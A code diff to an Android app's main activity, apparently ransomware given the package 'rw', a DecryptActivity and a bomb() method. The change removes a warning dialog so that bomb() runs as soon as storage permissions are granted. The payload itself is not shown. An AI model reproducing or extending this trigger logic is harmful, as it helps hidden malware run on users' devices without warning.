@@ -13,7 +13,10 @@ import android.os.Bundle;
 import android.os.SystemClock;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
+import android.util.Log;
+
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 
 import alepacheco.com.rw.activities.DecryptActivity;
@@ -42,26 +45,33 @@ public class MainActivity extends Activity {
             startActivity(new Intent(this,DecryptActivity.class));
             return;
         }
-
         setContentView(R.layout.activity_main);
 
-        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
+        {
+            boolean permit = checkPermissions();
+//            if (permit)
+//            {
+//                bomb();
+//            }
             // Alert for permisions
-            new AlertDialog.Builder(this)
-                    .setTitle(alepacheco.com.rw.R.string.alert_title)
-                    .setMessage(alepacheco.com.rw.R.string.alert_message)
-                    .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
-                        public void onClick(DialogInterface dialog, int which) {
-                            boolean permit = checkPermissions();
-                            if (permit) {
-                                bomb();
-                            }
-                        }
-                    })
-                    .setIcon(android.R.drawable.ic_dialog_info)
-                    .show();
-        } else {
-            bomb();
+//            new AlertDialog.Builder(this)
+//                    .setTitle(alepacheco.com.rw.R.string.alert_title)
+//                    .setMessage(alepacheco.com.rw.R.string.alert_message)
+//                    .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
+//                        public void onClick(DialogInterface dialog, int which) {
+//                            boolean permit = checkPermissions();
+//                            if (permit) {
+//                                bomb();
+//                            }
+//                        }
+//                    })
+//                    .setIcon(android.R.drawable.ic_dialog_info)
+//                    .show();
+        }
+        else
+        {
+//            bomb();
         }
     }
 
@@ -92,26 +102,39 @@ public class MainActivity extends Activity {
         }
     }
 
-    private boolean checkPermissions() {
+    public boolean checkPermissions()
+    {
         int result;
-        List<String> listPermissionsNeeded = new ArrayList<>();
-        for (String p : permissions) {
+        List<String> listPermissionsNeeded = new ArrayList<String>();
+        for (String p : permissions)
+        {
             result = ContextCompat.checkSelfPermission(this, p);
             if (result != PackageManager.PERMISSION_GRANTED) {
                 listPermissionsNeeded.add(p);
             }
         }
-        if (!listPermissionsNeeded.isEmpty()) {
-            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]), 100);
-            return checkPermissions();
+        if (!listPermissionsNeeded.isEmpty())
+        {
+            String[] permissions = listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]);
+            ActivityCompat.requestPermissions(this, permissions, 100);
+        }
+        else
+        {
+            int[] grantResults = new int[permissions.length];
+            Arrays.fill(grantResults, PackageManager.PERMISSION_GRANTED);
+            onRequestPermissionsResult(100, permissions,
+                    grantResults);
+//            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]), 100);
+//            return checkPermissions();
         }
         return true;
     }
     @Override
     public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
-        if (requestCode == 100) {
-            if (grantResults.length > 0
-                    && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+        if (requestCode == 100)
+        {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
+            {
                bomb();
             }
         }
